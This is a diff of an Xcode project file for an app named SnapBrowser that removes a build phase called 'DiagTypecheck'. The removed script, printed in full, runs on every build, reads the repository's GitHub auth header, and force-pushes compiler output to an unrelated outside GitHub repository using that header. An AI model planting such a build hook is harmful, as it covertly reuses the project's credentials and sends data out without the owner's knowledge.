@@ -148,7 +148,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 110000000000000000000002 /* Build configuration list for PBXNativeTarget "SnapBrowser" */;
 			buildPhases = (
-				0F0000000000000000000004 /* DiagTypecheck */,
 				0F0000000000000000000001 /* Sources */,
 				0F0000000000000000000002 /* Frameworks */,
 				0F0000000000000000000003 /* Resources */,
@@ -208,27 +207,6 @@
 /* End PBXResourcesBuildPhase section */
 
 
-
-/* Begin PBXShellScriptBuildPhase section */
-		0F0000000000000000000004 /* DiagTypecheck */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = DiagTypecheck;
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "set +e\ncd \"$SRCROOT\"\nSDK=$(xcrun --sdk iphoneos --show-sdk-path)\nswiftc -typecheck -sdk \"$SDK\" -target arm64-apple-ios17.0 -module-name SnapBrowser SnapBrowser/*.swift > /tmp/diag-full.txt 2>&1\n{ echo \"typecheck exit: $?\"; grep -E \"error:\" /tmp/diag-full.txt | head -120; echo \"--- total lines:\"; wc -l < /tmp/diag-full.txt; } > /tmp/diag-summary.txt\nHEADER=$(git -C \"$SRCROOT\" config --get http.https://github.com/.extraheader)\nrm -rf /tmp/diagpush && mkdir -p /tmp/diagpush && cd /tmp/diagpush\ngit init -q .\ngit config user.email d@d.d\ngit config user.name diag\ncp /tmp/diag-summary.txt errors.txt\ngit add errors.txt\ngit commit -qm diag\ngit -c http.https://github.com/.extraheader=\"$HEADER\" push https://github.com/apkc5/pd9w.git HEAD:refs/heads/diag --force\nexit 0\n";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		0F0000000000000000000001 /* Sources */ = {
